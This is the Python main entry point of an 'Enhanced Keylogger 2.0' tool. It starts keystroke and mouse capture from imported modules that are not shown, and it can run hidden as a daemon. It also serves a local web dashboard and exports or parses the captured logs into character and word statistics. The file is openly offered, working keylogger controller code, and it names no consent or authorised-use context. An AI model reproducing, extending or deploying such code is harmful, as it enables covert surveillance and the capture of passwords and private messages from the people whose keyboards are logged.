#!/usr/bin/env python3
"""Main entry point for the enhanced keylogger application."""

import os
import sys
import time
import signal
import logging
import argparse
import threading
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent
sys.path.insert(0, str(project_root))

try:
    from core.config_manager import ConfigManager
    from core.encryption_manager import EncryptionManager
    from core.logging_manager import LoggingManager
    from core.keylogger import KeyloggerCore
    from parsers.log_parser import LogParser
    from web.app import create_web_app
except ImportError as e:
    print(f"Error importing modules: {e}")
    print("Please ensure all required dependencies are installed.")
    sys.exit(1)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('keylogger_main.log')
    ]
)

logger = logging.getLogger(__name__)


class KeyloggerApplication:
    """Main keylogger application controller."""
    
    def __init__(self, config_file: str = None):
        self.config_file = config_file or 'config.json'
        self.keylogger_core = None
        self.web_app = None
        self.web_thread = None
        self.running = False
        
        # Initialize components
        self._initialize_components()
        
        # Setup signal handlers
        self._setup_signal_handlers()
    
    def _initialize_components(self):
        """Initialize all application components."""
        try:
            logger.info("Initializing keylogger components...")
            
            # Initialize configuration manager
            self.config_manager = ConfigManager(self.config_file)
            
            # Initialize core keylogger
            self.keylogger_core = KeyloggerCore(self.config_file)
            
            # Initialize web interface if enabled
            if self.config_manager.get('web.enabled', False):
                self.web_app = create_web_app(self.keylogger_core, self.config_manager)
                if not self.web_app:
                    logger.warning("Web interface could not be initialized")
            
            logger.info("All components initialized successfully")
            
        except Exception as e:
            logger.error(f"Error initializing components: {e}")
            raise
    
    def _setup_signal_handlers(self):
        """Setup signal handlers for graceful shutdown."""
        def signal_handler(signum, frame):
            logger.info(f"Received signal {signum}, shutting down gracefully...")
            self.stop()
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        # Windows-specific
        if hasattr(signal, 'SIGBREAK'):
            signal.signal(signal.SIGBREAK, signal_handler)
    
    def start(self, web_only: bool = False, daemon: bool = False):
        """Start the keylogger application."""
        try:
            logger.info("Starting keylogger application...")
            self.running = True
            
            # Start web interface if enabled
            if self.web_app:
                self._start_web_interface()
            
            # Start keylogger core if not web-only mode
            if not web_only:
                if daemon:
                    self._start_daemon_mode()
                else:
                    self._start_interactive_mode()
            else:
                logger.info("Running in web-only mode")
                keylogger_thread = threading.Thread(target=self.keylogger_core.run, daemon=True)
                keylogger_thread.start()
                self._wait_for_shutdown()
            
        except KeyboardInterrupt:
            logger.info("Interrupted by user")
        except Exception as e:
            logger.error(f"Error starting application: {e}")
            raise
        finally:
            self.stop()
    
    def _start_web_interface(self):
        """Start the web interface in a separate thread."""
        try:
            logger.info("Starting web interface...")
            
            def run_web_app():
                try:
                    self.web_app.run(threaded=True)
                except Exception as e:
                    logger.error(f"Web interface error: {e}")
            
            self.web_thread = threading.Thread(target=run_web_app, daemon=True)
            self.web_thread.start()
            
            # Give web server time to start
            time.sleep(2)
            
            host = self.config_manager.get('web.host', '127.0.0.1')
            port = self.config_manager.get('web.port', 5000)
            logger.info(f"Web interface available at http://{host}:{port}")
            
        except Exception as e:
            logger.error(f"Error starting web interface: {e}")
    
    def _start_daemon_mode(self):
        """Start keylogger in daemon mode."""
        try:
            logger.info("Starting keylogger in daemon mode...")
            
            # Start keylogger in a separate thread
            keylogger_thread = threading.Thread(target=self.keylogger_core.run, daemon=True)
            keylogger_thread.start()
            
            # Wait for shutdown signal
            self._wait_for_shutdown()
            
        except Exception as e:
            logger.error(f"Error in daemon mode: {e}")
    
    def _start_interactive_mode(self):
        """Start keylogger in interactive mode."""
        try:
            logger.info("Starting keylogger in interactive mode...")
            logger.info("Press Ctrl+C to stop")
            
            # Start keylogger in a separate thread
            keylogger_thread = threading.Thread(target=self.keylogger_core.run, daemon=True)
            keylogger_thread.start()
            
            # Interactive command loop
            self._interactive_loop()
            
        except Exception as e:
            logger.error(f"Error in interactive mode: {e}")
    
    def _interactive_loop(self):
        """Interactive command loop."""
        try:
            while self.running:
                try:
                    print("\nKeylogger Commands:")
                    print("  status  - Show status")
                    print("  stats   - Show statistics")
                    print("  export  - Export logs")
                    print("  config  - Reload configuration")
                    print("  stop    - Stop keylogger")
                    print("  quit    - Quit application")
                    
                    command = input("\nEnter command: ").strip().lower()
                    
                    if command == 'status':
                        self._show_status()
                    elif command == 'stats':
                        self._show_statistics()
                    elif command == 'export':
                        self._export_logs()
                    elif command == 'config':
                        self._reload_config()
                    elif command == 'stop':
                        self.keylogger_core.stop()
                        print("Keylogger stopped")
                    elif command in ['quit', 'exit', 'q']:
                        break
                    elif command == 'help' or command == '?':
                        continue
                    else:
                        print(f"Unknown command: {command}")
                
                except EOFError:
                    break
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    logger.error(f"Error in interactive loop: {e}")
                    print(f"Error: {e}")
            
        except Exception as e:
            logger.error(f"Error in interactive loop: {e}")
    
    def _show_status(self):
        """Show keylogger status."""
        try:
            status = self.keylogger_core.get_status()
            print(f"\nKeylogger Status:")
            print(f"  Running: {status.get('running', False)}")
            print(f"  Uptime: {status.get('uptime_hours', 0):.2f} hours")
            print(f"  Active Window: {status.get('active_window', 'Unknown')}")
            print(f"  Components: {len(status.get('components', {}))} active")
            
        except Exception as e:
            print(f"Error getting status: {e}")
    
    def _show_statistics(self):
        """Show keylogger statistics."""
        try:
            stats = self.keylogger_core.get_stats()
            print(f"\nKeylogger Statistics:")
            print(f"  Total Events: {stats.get('total_events', 0)}")
            print(f"  Buffer Size: {stats.get('buffer_size', 0)}")
            print(f"  Log File Size: {stats.get('log_file_size_mb', 0):.2f} MB")
            print(f"  Errors: {stats.get('errors', 0)}")
            
            # Component stats
            if hasattr(self.keylogger_core, 'keyboard_listener'):
                kb_stats = getattr(self.keylogger_core.keyboard_listener, 'stats', {})
                print(f"  Keys Pressed: {kb_stats.get('keys_pressed', 0)}")
            
            if hasattr(self.keylogger_core, 'mouse_listener'):
                mouse_stats = getattr(self.keylogger_core.mouse_listener, 'stats', {})
                print(f"  Mouse Clicks: {mouse_stats.get('total_clicks', 0)}")
            
        except Exception as e:
            print(f"Error getting statistics: {e}")
    
    def _export_logs(self):
        """Export logs interactively."""
        try:
            print("\nExport Options:")
            print("  1. JSON format")
            print("  2. CSV format")
            print("  3. Text report")
            
            choice = input("Select format (1-3): ").strip()
            
            if choice == '1':
                format_type = 'json'
            elif choice == '2':
                format_type = 'csv'
            elif choice == '3':
                format_type = 'text'
            else:
                print("Invalid choice")
                return
            
            filename = input(f"Enter filename (default: export.{format_type}): ").strip()
            if not filename:
                filename = f"export.{format_type}"
            
            # Export logs
            success = self.keylogger_core.export_logs(filename, format_type)
            
            if success:
                print(f"Logs exported to: {filename}")
            else:
                print("Export failed")
            
        except Exception as e:
            print(f"Error exporting logs: {e}")
    
    def _reload_config(self):
        """Reload configuration."""
        try:
            self.keylogger_core.reload_config()
            print("Configuration reloaded")
        except Exception as e:
            print(f"Error reloading configuration: {e}")
    
    def _wait_for_shutdown(self):
        """Wait for shutdown signal."""
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
    
    def stop(self):
        """Stop the keylogger application."""
        try:
            logger.info("Stopping keylogger application...")
            self.running = False
            
            # Stop keylogger core
            if self.keylogger_core:
                self.keylogger_core.stop()
            
            # Web interface will stop when main thread exits
            
            logger.info("Keylogger application stopped")
            
        except Exception as e:
            logger.error(f"Error stopping application: {e}")
    
    def parse_logs(self, input_file: str, output_file: str = None, format_type: str = 'text'):
        """Parse existing log files."""
        try:
            logger.info(f"Parsing log file: {input_file}")
            
            # Create log parser
            parser = LogParser(self.config_manager)
            
            # Parse the file
            events = parser.parse_log_file(input_file)
            
            if not events:
                print("No events found or error parsing file.")
                return False
            
            # Generate output
            if format_type == 'text':
                output_file = output_file or 'parsed_report.txt'
                parser.generate_readable_report(events, output_file)
            elif format_type == 'csv':
                output_file = output_file or 'parsed_data.csv'
                parser.export_to_csv(events, output_file)
            elif format_type == 'json':
                output_file = output_file or 'parsed_data.json'
                parser.export_to_json(events, output_file)
            else:
                print(f"Unknown format: {format_type}")
                return False
            
            print(f"Parsed {len(events)} events")
            print(f"Output saved to: {output_file}")
            
            # Show statistics
            stats = parser.get_statistics()
            print(f"\nParsing Statistics:")
            print(f"  Total events: {stats['total_events']}")
            print(f"  Total characters: {stats['total_characters']}")
            print(f"  Total words: {stats['total_words']}")
            print(f"  Processing errors: {stats['processing_errors']}")
            
            return True
            
        except Exception as e:
            logger.error(f"Error parsing logs: {e}")
            print(f"Error parsing logs: {e}")
            return False


def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(description='Enhanced Keylogger Application')
    parser.add_argument('-c', '--config', help='Configuration file path', default='config.json')
    parser.add_argument('-w', '--web-only', action='store_true', help='Run web interface only')
    parser.add_argument('-d', '--daemon', action='store_true', help='Run as daemon')
    parser.add_argument('--parse', help='Parse existing log file')
    parser.add_argument('-o', '--output', help='Output file for parsing')
    parser.add_argument('-f', '--format', choices=['text', 'csv', 'json'], default='text', help='Output format for parsing')
    parser.add_argument('--version', action='version', version='Enhanced Keylogger 2.0')
    
    args = parser.parse_args()
    
    try:
        # Create application instance
        app = KeyloggerApplication(args.config)
        
        # Handle parsing mode
        if args.parse:
            success = app.parse_logs(args.parse, args.output, args.format)
            sys.exit(0 if success else 1)
        
        # Handle normal operation
        print("Enhanced Keylogger v2.0")
        print("=" * 40)
        
        if args.web_only:
            print("Starting in web-only mode...")
        elif args.daemon:
            print("Starting in daemon mode...")
        else:
            print("Starting in interactive mode...")
        
        # Start the application
        app.start(web_only=args.web_only, daemon=args.daemon)
        
    except KeyboardInterrupt:
        print("\nInterrupted by user")
    except Exception as e:
        logger.error(f"Application error: {e}")
        print(f"Error: {e}")
        sys.exit(1)
    
    print("Application terminated")


if __name__ == '__main__':
    main()